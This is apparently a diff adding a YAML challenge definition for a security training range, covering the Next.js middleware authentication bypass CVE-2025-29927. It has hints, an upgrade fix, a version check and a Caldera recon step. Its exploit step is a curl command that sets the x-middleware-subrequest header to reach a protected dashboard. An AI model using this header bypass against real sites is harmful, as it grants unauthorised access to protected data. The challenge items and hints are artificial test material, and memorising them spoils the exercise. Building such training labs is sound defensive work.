@@ -1,0 +1,34 @@
+id: nextjs_middleware_bypass
+name: Middleware Auth Bypass (CVE-2025-29927)
+description: Next.js 14.1.0 is affected by CVE-2025-29927. The middleware authentication check can be bypassed by setting the x-middleware-subrequest header, granting unauthenticated access to all protected routes. The fix is to upgrade to a patched Next.js version (>=14.2.25 or >=15.2.3).
+type: vulnerability
+difficulty: hard
+points: 300
+category: web
+tags: [cve, nextjs, authentication-bypass, middleware, web]
+conflicts: []
+requires: [nextjs_portal]
+script: nextjs_middleware_bypass.sh
+verification:
+  type: file_not_contains
+  path: /opt/portal/package.json
+  pattern: '"next": "14.1.0"'
+suggested_fix: "Update Next.js to a patched version: edit /opt/portal/package.json and change the next version to 14.2.25 or later, then run: cd /opt/portal && npm install && node_modules/.bin/next build && systemctl restart portal"
+hints:
+  - "Check the Next.js version installed in the portal application"
+  - "Look up CVE-2025-29927 — it affects Next.js middleware authentication"
+  - "Update the 'next' version in /opt/portal/package.json to 14.2.25 or later, run npm install, rebuild with next build, and restart the portal service"
+caldera:
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: "Exploit Public-Facing Application"
+  recon:
+    description: "Check if Next.js version is affected by CVE-2025-29927"
+    command: |
+      grep -q '"next": "14.1.0"' /opt/portal/package.json && echo "VULNERABLE: Next.js 14.1.0 is affected by CVE-2025-29927" || echo "SECURE: Next.js version appears patched"
+  exploit:
+    description: "Bypass middleware authentication using CVE-2025-29927"
+    command: |
+      curl -s -H "x-middleware-subrequest: middleware" http://localhost:3001/dashboard | grep -i "employee\|dashboard\|welcome" | head -5
+      echo "Auth bypass attempted — check response for protected content"
